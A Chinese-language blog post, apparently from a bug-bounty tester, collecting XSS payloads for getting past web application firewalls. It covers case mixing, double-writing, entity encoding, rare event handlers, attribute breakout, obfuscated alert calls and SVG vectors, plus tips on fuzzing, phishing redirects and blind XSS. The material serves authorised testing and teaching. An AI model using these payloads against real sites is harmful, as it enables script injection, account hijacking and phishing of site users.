---
title: XSS 绕过 WAF 的几个思路
date: 2025-06-10 08:00:00
updated: 2026-06-01 08:00:00
tags:

  - Web安全
  - 渗透测试

categories: 渗透测试
description: 记录几种实际挖 SRC 时遇到的 XSS 绕过 WAF 手法，包括大小写混写、双写、编码绕过、标签属性组合、onerror 变体等。
---

挖 SRC 时最简单的漏洞之一就是反射 XSS，但现在基本都有 WAF。绕过思路比 payload 更重要。

## 常见 WAF 拦截点

- 关键词 `script`、`alert`、`onerror`、`onload`
- `<` `>` 尖括号
- `javascript:` 伪协议
- `eval`、`document.cookie` 等敏感调用

## 绕过手法

### 1. 标签名大小写混写

有些 WAF 对标签名匹配是大小写敏感的：

```html
<ScRiPt>alert(1)</ScRiPt>
<ImG src=x onerror=alert(1)>
```

### 2. 双写绕过

WAF 的一次性替换不够健壮时：

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

WAF 把中间的 `<script>` 和 `</script>` 删掉后，剩下的 `script` 又拼成一个完整的。

### 3. HTML 实体/URL 编码

```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```

### 4. 用不常见的标签和事件

标签不限于 `<script>` 和 `<img>`，事件也不限于 `onerror`：

```html
<details open ontoggle=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<select onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
```

### 5. 利用 URL 参数的二次拼接

很多站点的搜索框把输入拼到 URL 后面再回显。比如搜索 `test` 后 URL 变成 `/search?q=test`，页面里出现 `搜索"test"的结果`。试试把闭合标签写进去：

```
"><img src=x onerror=alert(1)>
```

或者先闭合属性再写入事件：

```
" onfocus="alert(1)" autofocus="
```

### 6. `onerror` 的变体写法

`alert` 被过滤时换一种写法：

```html
<img src=x onerror=top['al'+'ert'](1)>
<img src=x onerror=window['\\x61lert'](1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=prompt(1)>
<img src=x onerror=confirm(1)>
```

### 7. `javascript:` 绕过

```html
<!-- URL 不区分大小写 -->
<a href="jAvAsCriPt:alert(1)">x</a>
<!-- 加空白符 -->
<a href="javascript&#x3a;alert(1)">x</a>
<!-- tab/换行 -->
<a href="jav&#x09;ascript:alert(1)">x</a>
```

### 8. SVG 场景

富文本编辑器或文件上传场景下，SVG 是个常见缺口：

```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>

<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)' /></svg>#x"></use></svg>
```

## 几点经验

1. **Burp Intruder 是必备的。** 把常见的 XSS payload 做成字典，批量试过去。很多站用的是老版 WAF，缺一两个 payload 就躲过去了。
2. **看页面 DOM 结构再构造。** 没看源码直接复制 payload 大概率没用。你的输入出现在标签里、属性里、还是 JS 字符串里，绕过思路完全不一样。
3. **CSP 限制了 alert 不代表不能 XSS。** 如果页面允许注入脚本但 CSP 禁了内联 JS，可以试试用 `document.write` 或者 `location.href` 做跳转钓鱼，也算有效利用。
4. **WAF 规则会漏。** 重点是不断试，不急。有的规则就是写得太简单，换个写法就过。
5. **盲 XSS 别忘了。** 一些后台系统、工单系统、客服对话里能嵌入你的代码，前端看不到弹窗不代表没有漏洞。

---

> 这些 payload 只在授权的 SRC 和靶场里用过。实际绕过效果取决于 WAF 版本和配置。
